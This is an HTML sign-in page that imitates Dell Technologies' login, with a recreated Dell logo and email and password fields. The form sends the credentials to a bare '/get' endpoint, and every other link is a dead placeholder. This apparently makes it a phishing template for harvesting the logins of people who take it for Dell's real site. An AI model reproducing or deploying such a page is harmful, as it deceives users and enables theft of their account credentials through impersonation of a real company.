<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <title>Sign In - Dell Technologies</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #fff;
            min-height: 100vh;
            padding: 24px;
        }

        .logo {
            margin-bottom: 48px;
        }

        .logo svg {
            height: 24px;
        }

        .container {
            max-width: 640px;
            margin: 0 auto;
        }

        .title {
            font-size: 42px;
            font-weight: 400;
            color: #000;
            text-align: center;
            margin-bottom: 40px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .input {
            width: 100%;
            height: 56px;
            padding: 16px;
            border: 1px solid #000;
            border-radius: 0;
            font-size: 16px;
            color: #000;
            background: #fff;
            outline: none;
        }

        .input::placeholder {
            color: #666;
        }

        .input:focus {
            border-color: #0672cb;
            box-shadow: 0 0 0 1px #0672cb;
        }

        .reset-link {
            display: block;
            text-align: center;
            color: #0672cb;
            text-decoration: none;
            font-size: 16px;
            margin-bottom: 24px;
        }

        .reset-link:hover {
            text-decoration: underline;
        }

        .submit-btn {
            width: 100%;
            height: 52px;
            background: #0672cb;
            color: #fff;
            border: none;
            border-radius: 0;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        .submit-btn:hover {
            background: #0560a8;
        }

        .create-section {
            text-align: center;
            margin-top: 40px;
            padding-bottom: 32px;
            border-bottom: 1px solid #e0e0e0;
            font-size: 16px;
            color: #000;
        }

        .create-section a {
            color: #0672cb;
            text-decoration: none;
        }

        .create-section a:hover {
            text-decoration: underline;
        }

        .help-section {
            text-align: center;
            margin-top: 32px;
            font-size: 16px;
            color: #000;
        }

        .help-section a {
            color: #0672cb;
            text-decoration: none;
        }

        .help-section a:hover {
            text-decoration: underline;
        }

        @media (max-width: 680px) {
            .title {
                font-size: 32px;
            }
        }
    </style>
</head>
<body>
<div class="logo">
    <svg viewBox="0 0 220 28" xmlns="http://www.w3.org/2000/svg">
        <text x="0" y="22" font-family="Arial, sans-serif" font-size="24" font-weight="700" fill="#0672cb">DELL</text>
        <text x="58" y="22" font-family="Arial, sans-serif" font-size="24" font-weight="400" fill="#0672cb">Technologies</text>
    </svg>
</div>

<div class="container">
    <h1 class="title">Sign In</h1>

    <form action="/get" id="email-form-step">
        <div class="form-group">
            <input type="text" name="email" class="input" placeholder="Email Address" required>
        </div>

        <div class="form-group">
            <input type="password" name="password" class="input" placeholder="Password" required>
        </div>

        <a href="#" class="reset-link">Create or Reset password</a>

        <button type="submit" class="submit-btn">Continue</button>
    </form>

    <p class="create-section">
        Don't have a Dell account? <a href="#">Create an account</a>
    </p>

    <p class="help-section">
        Need help signing in? <a href="#">View FAQ</a>
    </p>
</div>
</body>
</html>
